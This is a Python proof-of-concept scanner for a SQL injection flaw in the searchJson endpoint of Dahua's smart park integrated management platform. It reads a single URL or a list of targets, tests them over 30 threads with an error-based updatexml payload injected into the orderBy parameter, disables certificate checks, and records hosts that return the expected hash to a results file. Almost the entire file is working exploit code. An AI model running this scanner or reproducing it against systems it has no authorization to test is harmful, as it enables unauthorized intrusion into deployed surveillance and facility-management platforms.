#导包
import requests,argparse,sys,re,json
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
                        __      __                 ________    __ 
  ___ ___ ___ _________/ /  __ / /__ ___  ___     / __/ __ \  / / 
 (_-</ -_) _ `/ __/ __/ _ \/ // (_-</ _ \/ _ \   _\ \/ /_/ / / /__
/___/\__/\_,_/_/  \__/_//_/\___/___/\___/_//_/__/___/\___\_\/____/
                                            /___/                 
"""
    print(test)
def main():
    # 处理命令参数
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台searchJson_SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fb:
            for url in fb.readlines():
                url_list.append(url.strip())
        mp = Pool(30)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload='/portal/services/carQuery/getFaceCapture/searchJson/{}/pageJson/{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select md5(1)),0x7e),1)--"}/extend/{}'
    headers={
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive',
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=target+payload,headers=headers,proxies=proxies,timeout=15,verify=False)
        match = re.search(r"XPATH syntax error: '(.+?)'",res.text)
        #print(match.group(1))
        if match.group(1) == "~c4ca4238a0b923820dcc509a6f75849":
            print(f'[+]{target} have loopholes {target+payload}')
            with open('result.txt','a',encoding='utf-8') as fb:
                fb.write(target.strip()+'\n')
    except:
        pass
if __name__ == "__main__":
    main()
